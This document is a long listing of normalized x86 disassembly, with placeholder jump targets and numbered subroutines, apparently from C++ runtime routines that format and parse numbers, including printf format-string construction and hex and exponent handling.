mov [ esp + 0x88 ] 0x1
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
push ebx
lea ecx [ esp + 0x44 ]
mov [ esp + 0x38 ] al
mov [ esp + 0x5c ] 0xf
call sub_10002004
mov [ esp + 0x88 ] 0x2
mov al [ edi ]
cmp al 0x2b
je r-xdata
mov [ esp + 0x1c ] 0x1
mov [ esp + 0x1c ] ebx
cmp al 0x2d
jne r-xdata
cmp [ esp + 0x74 ] 0x10
mov eax [ esp + 0x60 ]
jae r-xdata
mov [ ebp + 0x2c ] ebx
call sub_10024c18
mov eax [ eax ]
push [ ebp + 0x30 ]
mov al [ eax ]
push 0x65
push edi
mov [ esp + 0x24 ] al
mov [ esp + 0x25 ] 0x65
mov [ esp + 0x26 ] 0x0
call sub_10024c40
push [ ebp + 0x30 ]
mov esi eax
movsx eax [ esp + 0x28 ]
push eax
push edi
call sub_10024c40
add esp 0x18
mov [ esp + 0x14 ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ esp + 0x60 ]
mov ecx [ ebp + 0x28 ]
mov eax [ ebp + 0x24 ]
mov edx [ esp + 0x2c ]
add eax ecx
add eax [ ebp + 0x2c ]
mov ecx [ edx + 0x18 ]
add eax [ ebp + 0x30 ]
cmp ecx ebx
jle r-xdata
cmp [ esp + 0x74 ] 0x10
mov eax [ esp + 0x60 ]
jae r-xdata
mov [ esp + 0x14 ] ebx
cmp ecx eax
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x60 ]
movsx eax [ esp + 0x18 ]
push [ ebp + 0x30 ]
push eax
push edi
call sub_10024c40
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
sub ecx eax
mov [ esp + 0x14 ] ecx
jmp r-xdata
push [ ebp + 0x30 ]
lea ecx [ esp + 0x44 ]
push edi
call sub_10008756
cmp esi ebx
jne r-xdata
push [ ebp + 0x30 ]
push 0x65
push edi
call sub_10024c40
add esp 0xc
cmp eax ebx
je r-xdata
push [ esp + 0x34 ]
sub eax edi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push edi
push [ ebp + 0x14 ]
lea eax [ esp + 0x2c ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1000bfbc
mov ecx [ eax ]
push [ ebp + 0x24 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x48 ]
push eax
push esi
call sub_1000b6da
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0x58 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
push 0x1
mov [ esp + 0x28 ] al
push [ esp + 0x28 ]
lea eax [ esp + 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1000b6da
mov ecx [ eax ]
push [ ebp + 0x28 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x4c ]
push eax
push esi
call sub_1000b6da
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x30
add edi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ esp + 0x14 ]
lea eax [ esp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1000b6da
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ esp + 0x2c ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ esp + 0x1c ] ebx
jbe r-xdata
mov eax [ edx + 0x10 ]
mov esi [ ebp + 0x8 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ esp + 0x14 ] ebx
jne r-xdata
push 0x30
push [ ebp + 0x2c ]
lea ecx [ esp + 0x48 ]
call sub_10007a24
jmp r-xdata
push [ esp + 0x34 ]
lea eax [ esp + 0x28 ]
push [ ebp + 0x30 ]
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1000bfbc
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x60 ]
push eax
push esi
call sub_1000b6da
mov ecx [ eax ]
push [ esp + 0x48 ]
mov edx [ esp + 0x64 ]
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ esp + 0x74 ]
mov [ ebp + 0x14 ] eax
push esi
mov [ edx + 0x18 ] ebx
call sub_1000b6da
add esp 0x4c
push ebx
push 0x1
lea ecx [ esp + 0x48 ]
call sub_10002020
push ebx
push 0x1
lea ecx [ esp + 0x64 ]
call sub_10002020
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x80 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x68 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
push [ esp + 0x34 ]
sub eax edi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push edi
push [ ebp + 0x14 ]
lea eax [ esp + 0x34 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1000bfbc
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x50 ]
push eax
push esi
call sub_1000b6da
mov ecx [ eax ]
and [ ebp + 0x2c ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
mov ecx [ esp + 0x60 ]
add esp 0x34
test [ ecx + 0x10 ] 0x4
mov ecx r--data
jne r-xdata
push 0x1
push edi
push [ ebp + 0x14 ]
lea eax [ esp + 0x28 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1000bf88
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc edi
dec [ ebp + 0x30 ]
mov [ ebp + 0x14 ] eax
push 0x30
push [ ebp + 0x2c ]
sub esi edi
push esi
lea ecx [ esp + 0x4c ]
call sub_10007a72
push 0x30
push [ ebp + 0x24 ]
lea ecx [ esp + 0x48 ]
call sub_10007a24
mov [ ebp + 0x24 ] ebx
mov esi [ esp + 0x14 ]
push 0x30
lea ecx [ esp + 0x44 ]
cmp esi ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x34 ]
push eax
push esi
call sub_1000bf88
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add edi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
push [ ebp + 0x28 ]
sub esi edi
lea eax [ esi + 0x1 ]
push eax
call sub_10007a72
push 0x30
push [ ebp + 0x24 ]
lea ecx [ esp + 0x48 ]
push esi
call sub_10007a72
mov [ ebp + 0x28 ] ebx
push [ ebp + 0x24 ]
call sub_10007a24
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
push ebx
lea ecx [ esp + 0x48 ]
call sub_10007b0c
push eax
call sub_10024cf0
pop ecx
pop ecx
mov edi eax
jmp r-xdata
lea esi [ esp + 0x60 ]
cmp [ esp + 0x74 ] 0x10
mov esi [ esp + 0x60 ]
mov [ ebp + 0x24 ] ebx
jae r-xdata
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
push ebx
lea ecx [ esp + 0x44 ]
call sub_10007b0c
mov edi eax
mov eax [ esp + 0x54 ]
mov [ ebp + 0x2c ] ebx
mov [ ebp + 0x30 ] eax
mov ecx edi
sub ecx [ esp + 0x1c ]
movsx eax al
cmp eax ecx
jae r-xdata
push ebx
sub edi eax
push 0x1
push edi
lea ecx [ esp + 0x4c ]
call sub_10007a72
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_1000b416
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ esp + 0x18 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x49
inc ecx
mov [ ecx ] 0x36
inc ecx
mov [ ecx ] 0x34
mov [ ecx ] bl
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
mov esi edx
and esi 0xe00
inc ecx
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
sub_1000b48a
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d60d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x38 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x20 ]
push eax
mov ecx edi
mov [ esp + 0x20 ] edi
call sub_10003446
and [ esp + 0x58 ] 0x0
push eax
call sub_1000c26d
or [ esp + 0x5c ] 0xffffffff
pop ecx
lea ecx [ esp + 0x20 ]
mov [ esp + 0x24 ] eax
call sub_10003c49
mov ecx [ esp + 0x24 ]
lea eax [ esp + 0x2c ]
push eax
call sub_1000c088
xor ecx ecx
inc ecx
mov [ esp + 0x58 ] ecx
mov al [ esi ]
cmp al 0x2b
je r-xdata
mov [ esp + 0x10 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ esp + 0x30 ]
cmp al 0x30
jne r-xdata
mov ebx [ edi + 0x18 ]
test ebx ebx
jle r-xdata
cmp [ esp + 0x44 ] 0x10
mov eax ecx
jae r-xdata
and [ esp + 0x10 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor ebx ebx
cmp ebx [ ebp + 0x24 ]
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x30 ]
cmp [ esp + 0x44 ] 0x10
mov ecx [ esp + 0x30 ]
mov eax ecx
jae r-xdata
mov [ esp + 0x10 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ esp + 0x20 ] al
push [ esp + 0x20 ]
lea eax [ esp + 0x18 ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1000bfbc
mov ecx [ eax ]
mov edx [ esp + 0x38 ]
push ebx
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
and [ edx + 0x18 ] 0x0
push eax
push ecx
push [ esp + 0x54 ]
mov [ ebp + 0x14 ] eax
push edi
call sub_1000b6da
add esp 0x34
push 0x0
push 0x1
lea ecx [ esp + 0x34 ]
call sub_10002020
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x38 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
cmp eax 0x100
lea eax [ esp + 0x14 ]
je r-xdata
sub ebx [ ebp + 0x24 ]
jmp r-xdata
cmp [ esp + 0x44 ] 0x10
jb r-xdata
push [ esp + 0x10 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1000bf88
mov ecx [ eax ]
add esi [ esp + 0x28 ]
push ebx
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ esp + 0x34 ]
push [ eax ]
sub [ ebp + 0x24 ] ecx
lea eax [ esp + 0x3c ]
push eax
push edi
call sub_1000b6da
add esp 0x30
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1000b6da
add esp 0x18
jmp r-xdata
mov eax [ edi + 0x10 ]
mov edi [ ebp + 0x8 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
lea eax [ esp + 0x30 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor ebx ebx
mov [ ebp + 0x14 ] eax
mov edi [ esp + 0x1c ]
test al al
jle r-xdata
mov edi [ ebp + 0x24 ]
mov ecx edi
sub ecx [ esp + 0x10 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp + 0x24 ]
sub eax edi
inc eax
push eax
lea ebx [ esi + edi ]
push ebx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
call sub_100245ce
mov eax [ esp + 0x24 ]
add esp 0x10
inc [ ebp + 0x24 ]
inc eax
mov [ ebx ] 0x0
cmp [ eax ] 0x0
jle r-xdata
mov eax [ esp + 0x14 ]
mov al [ eax ]
cmp al 0x7f
je r-xdata
mov [ esp + 0x14 ] eax
jmp r-xdata
sub_1000b6da
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_1000c054
dec [ ebp + 0x1c ]
jne r-xdata
sub_1000b703
push 0x58
mov eax sub_1004d5d8
call sub_1002826c
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
mov [ ebp - 0x60 ] ebx
call sub_1000c26d
mov esi eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_1000c088
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
mov [ ebp - 0x4a ] al
mov [ ebp - 0x4a ] 0x0
jmp r-xdata
mov eax [ ebp + 0x18 ]
push 0x8
pop ebx
and eax 0xe00
push 0xa
pop esi
cmp eax 0x400
jne r-xdata
mov ecx edi
call sub_1000c075
mov ecx edi
cmp al 0x2b
jne r-xdata
push [ ebp - 0x5c ]
mov ecx edi
mov [ ebp - 0x50 ] ebx
call sub_1000c5af
test al al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x54 ] ebx
jmp r-xdata
call sub_1000c075
cmp al 0x2d
jne r-xdata
mov [ ebx ] al
jmp r-xdata
neg eax
sbb eax eax
and eax esi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x54 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov [ ebp - 0x58 ] 0x0
push edi
mov [ ebp - 0x49 ] 0x0
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebx ] al
mov ecx edi
inc ebx
mov [ ebp - 0x50 ] ebx
call sub_1000c0bf
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov ecx edi
call sub_1000c075
cmp al 0x30
jne r-xdata
mov [ ebp - 0x64 ] esi
cmp [ ebp - 0x54 ] esi
je r-xdata
mov ecx edi
mov [ ebp - 0x58 ] 0x1
call sub_1000c0bf
push [ ebp - 0x5c ]
push edi
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov ecx edi
call sub_1000c075
mov ecx [ ebp - 0x50 ]
push [ ebp - 0x64 ]
mov [ ecx ] al
movsx eax al
push eax
push r--data
call sub_10024c40
add esp 0xc
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x54 ] ebx
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov ecx edi
call sub_1000c075
cmp al 0x78
je r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea esi [ ebp - 0x44 ]
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
call sub_100079fe
push [ ebp - 0x5c ]
mov esi [ ebp - 0x60 ]
push edi
mov [ ebp - 0x4 ] 0x1
xor ebx ebx
add esi 0x1f
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x54 ] ebx
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov ecx edi
call sub_1000c075
cmp al 0x58
jne r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x50 ] eax
test ebx ebx
jbe r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x4a ] 0x0
je r-xdata
cmp [ ebp - 0x50 ] esi
jae r-xdata
mov eax [ ebp - 0x50 ]
cmp [ eax ] 0x30
je r-xdata
mov ecx edi
mov [ ebp - 0x54 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_1000c0bf
jmp r-xdata
cmp [ ebp - 0x54 ] 0x10
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
jle r-xdata
mov ecx edi
call sub_1000c075
cmp al [ ebp - 0x4a ]
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
call sub_10007b0c
cmp [ eax ] 0x7f
je r-xdata
inc [ ebp - 0x50 ]
mov [ ebp - 0x49 ] 0x1
mov eax [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_10002020
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002020
mov eax [ ebp - 0x54 ]
call sub_100282ef
retn
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10007a24
inc ebx
mov ecx edi
call sub_1000c0bf
push [ ebp - 0x5c ]
push edi
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
inc [ eax ]
jmp r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov esi eax
jmp r-xdata
sub_1000b9ca
push 0x5c
mov eax sub_1004d5a3
call sub_1002826c
mov eax [ ebp + 0x18 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
push eax
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x60 ] ebx
call sub_1000c26d
pop ecx
mov ecx eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x64 ] ecx
call sub_1000c088
and [ ebp - 0x4 ] 0x0
push ebx
mov ecx esi
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x4a ] 0x0
call sub_1000c5af
test al al
jne r-xdata
and [ ebp - 0x54 ] 0x0
and [ ebp - 0x5c ] 0x0
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x49 ] 0x0
jae r-xdata
mov ecx esi
call sub_1000c075
mov ecx esi
cmp al 0x2b
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_1000c075
cmp al 0x2d
jne r-xdata
mov [ edi ] al
jmp r-xdata
push ebx
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov [ edi ] al
mov ecx esi
inc edi
mov [ ebp - 0x50 ] edi
call sub_1000c0bf
push [ ebp - 0x60 ]
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x30
jl r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x54 ] 0x0
mov ebx [ ebp - 0x60 ]
je r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx esi
mov bl al
call sub_1000c075
cmp al bl
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x39
jg r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x55 ] al
call sub_100079fe
push [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
push esi
xor ebx ebx
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
mov edi [ ebp - 0x50 ]
jmp r-xdata
call sub_10024c18
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1000c0bf
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
cmp [ ebp - 0x54 ] 0x24
jl r-xdata
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
jae r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x30
jl r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x30
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
mov edi [ ebp - 0x50 ]
jge r-xdata
push ebx
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx esi
call sub_1000c075
cmp al 0x30
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
lea edi [ ebp - 0x28 ]
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x39
jg r-xdata
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000c0bf
mov [ edi ] 0x30
inc edi
inc [ ebp - 0x5c ]
jmp r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x30
jl r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_1000c075
mov ecx [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x54 ]
mov [ ecx ] al
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000c0bf
push [ ebp - 0x60 ]
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_10002020
jmp r-xdata
test ebx ebx
jbe r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp - 0x55 ] 0x0
je r-xdata
cmp [ ebp - 0x54 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x39
jg r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
push ebx
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
cmp [ edi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
cmp [ eax ] 0x0
jle r-xdata
mov ecx esi
call sub_1000c075
cmp al [ ebp - 0x55 ]
jne r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x30
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
cmp [ ebp - 0x54 ] 0x24
jge r-xdata
mov edi [ ebp - 0x68 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x65
je r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x4a ] 0x1
inc ebx
jmp r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10007a24
inc ebx
mov ecx esi
call sub_1000c075
mov ecx [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x54 ]
mov [ ecx ] al
cmp [ ebp - 0x54 ] edi
je r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
cmp [ eax ] 0x7f
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000c0bf
mov ecx esi
call sub_1000c075
mov [ edi ] al
inc edi
inc [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi ] 0x0
call sub_10002020
mov eax [ ebp - 0x5c ]
call sub_100282ef
retn
mov [ edi ] 0x65
mov ecx esi
inc edi
call sub_1000c0bf
and [ ebp - 0x54 ] 0x0
push ebx
mov ecx esi
mov [ ebp - 0x49 ] 0x0
call sub_1000c5af
test al al
jne r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x45
jne r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
mov cl [ edi ]
cmp cl [ eax ]
jne r-xdata
mov ecx esi
call sub_1000c0bf
push [ ebp - 0x60 ]
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
inc [ eax ]
jmp r-xdata
push ebx
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_1000c075
mov ecx esi
cmp al 0x2b
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10007b0c
mov cl [ edi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x4a ] 0x1
push ebx
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x30
jne r-xdata
call sub_1000c075
cmp al 0x2d
jne r-xdata
mov [ edi ] al
jmp r-xdata
mov edi eax
jmp r-xdata
mov ecx esi
call sub_1000c075
cmp al 0x30
jl r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000c0bf
push ebx
push esi
call sub_1000c45a
pop ecx
pop ecx
test al al
jne r-xdata
mov [ edi ] al
mov ecx esi
inc edi
call sub_1000c0bf
mov ecx esi
call sub_1000c075
cmp al 0x39
jg r-xdata
mov [ edi ] 0x30
inc edi
jmp r-xdata
cmp [ ebp - 0x54 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000c0bf
mov ecx esi
call sub_1000c075
mov [ edi ] al
inc edi
inc [ ebp - 0x54 ]
sub_1000beda
push 0x0
mov eax sub_1004e82c
call sub_10028203
mov esi ecx
call sub_10003a0e
mov eax [ ebp + 0x8 ]
mov [ esi + 0x28 ] eax
lea eax [ ebp + 0x8 ]
xor ebx ebx
push eax
mov ecx esi
mov [ esi + 0x2c ] ebx
call sub_10003446
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000cd79
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp + 0x8 ]
mov edi eax
call sub_10003c49
mov eax [ edi ]
push 0x20
mov ecx edi
call [ eax + 0x18 ]
mov [ esi + 0x30 ] al
cmp [ esi + 0x28 ] ebx
jne r-xdata
mov [ esi + 0x4 ] ebx
call sub_100282db
retn 0x4
mov eax [ esi + 0x8 ]
or eax 0x4
push ebx
push esi
mov ecx eax
call sub_10003dcd
sub_1000bf46
lea edx [ eax + 0x18 ]
mov [ eax + 0x20 ] edx
lea edx [ eax + 0x1c ]
